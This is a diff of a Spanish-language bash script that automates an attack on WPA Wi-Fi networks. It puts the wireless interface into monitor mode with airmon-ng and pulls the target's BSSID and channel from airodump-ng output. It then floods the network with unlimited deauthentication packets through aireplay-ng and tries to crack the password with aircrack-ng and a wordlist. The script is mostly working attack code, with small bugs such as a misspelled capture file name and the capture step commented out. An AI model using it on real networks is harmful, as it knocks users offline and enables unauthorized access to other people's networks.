@@ -64,20 +64,18 @@ function is_number(){
 
 #Cambiar interfaz a modo promiscuo
 function monitoring_mode(){
-    ip link set $1 down
-    iw $1 set monitor none
-    ip link set $1 up
     #Matamos aquellos procesos que puedan dar problemas
-    #airmon-ng check kill
+    airmon-ng check kill
     #Ejecutamos modo monitoreo
-    #airmon-ng start $1
+    airmon-ng start $1
 }
 
 #Cambiare interface a modo normal
 function manage_mode(){
-    ip link set $1 down
-    iw $1 set type managed
-    ip link set $1 up
+    #ip link set $1 down
+    #iw $1 set type managed
+    #ip link set $1 up
+    airmon-ng stop $1
 }
 
 #------------------------------------------------------------------------------------------------
@@ -99,7 +97,7 @@ echo ""
 ES_NUMERO=false
 while [ "$ES_NUMERO" = false ]
 do
-    echo -e -n " Elige una interface $BOLD_WHITE\033[5m>\033[0m"
+    echo -e -n " Elige una interface $BOLD_WHITE\033[5m>\033[0m "
     read INTERFACE
     is_number $INTERFACE
     ES_NUMERO=$IS
@@ -110,16 +108,15 @@ done
 #Nos guardamos el nombre de la interfaz que ha decidido elegir
 
 arr=(${OUTPUT})
-echo -e ${arr[$INTERFACE-1]}
 INT_NAME=${arr[$INTERFACE-1]}
 
 #-------------------------------------------------------------
 
 #Pasamos interface a modo monitoreo
 
-echo -e "$INT_NAME va a pasar a modo monitoreo"
+echo -e " $BOLD_RED$INT_NAME$WHITE va a pasar a modo monitoreo"
 monitoring_mode $INT_NAME
-#iw dev
+INT_NAME="${INT_NAME}mon"
 
 #----------------------------------
 
@@ -127,27 +124,51 @@ monitoring_mode $INT_NAME
 SI_NO=test
 while [[ "$SI_NO" != "S" && "$SI_NO" != "s" && "$SI_NO" != "n" && "$SI_NO" != "N" ]]
 do
-    echo -e -n " ¿Conoce el BSSID del router que quiere atacar?(S/N) $BOLD_WHITE\033[5m>\033[0m"
+    echo -e -n " ¿Conoce el BSSID y canal del router que quiere atacar?(S/N) $BOLD_WHITE\033[5m>\033[0m "
     read SI_NO
 done
 
 if [[ "$SI_NO" == "S" || "$SI_NO" == "s" ]]
 then
-    echo -e -n " Introduce BBSID $BOLD_WHITE\033[5m>\033[0m"
+    echo -e -n " Introduce BBSID $BOLD_WHITE\033[5m>\033[0m "
     read BSSID
-    #Atacar directamente al BSSID
-    #Vamos a obtener que terminal usa para poder abrir el airodump en otra ventana
-    TERM=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
-    konsole -e airodump-ng -w info --output-format csv wlp1s0 -d $BSSID
-    #NO HACER NADA DE LO ANTERIOR
-    #PROBAR CON
-    screen -d -m airodump-ng -w info --output-format csv $INT_NAME -d $BSSID
+  
+    echo -e -n " Introduce el canal $BOLD_WHITE\033[5m>\033[0m "
+    read CANAL
 else
     #Abrir ventana airodump
-    echo "de momento no hace nada"
+    timeout --foreground 4 airodump-ng -w info --output-format csv $INT_NAME
+    echo ""
+    echo -e -n " Introduce el nombre de la red que quieres atacar $BOLD_WHITE\033[5m>\033[0m "
+    read RED
+	
+    #Extraer canal y BSSID
+    LINEA=$(cat info-01.csv | grep $RED)
+    IFS=', '
+    read -a info <<< $LINEA
+    CANAL=${info[5]}
+    BSSID=${info[0]}
 fi
 
-echo "programa continua"
+#Mostramos informacion sobre el punto de acceso
+echo ""
+echo -e "$BOLD_BLUE Información sobre el punto de acceso:"
+echo -e "$BOLD_WHITE BSSID: $WHITE$BSSID"
+echo -e "$BOLD_WHITE Canal: $WHITE$CANAL"
+rm info-01.csv
+
+#Empezamos a capturar hasta encontrar el handshake
+#screen -d -m airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $INT_NAME
+
+#Lanzamos el ataque (paquetes de deautentificacion)
+echo -e "$BOLD_RED Enviando paquetes de deautentificacion"
+aireplay-ng --deauth 0 -a $BSSID $INT_NAME
 
 
+#Probamos a crackear la contraseña
+echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
+read WORDLIST
+
+aircrack-ng hanshake-o1.cap -w $WORDLIST
+manage_mode $INT_NAME
 
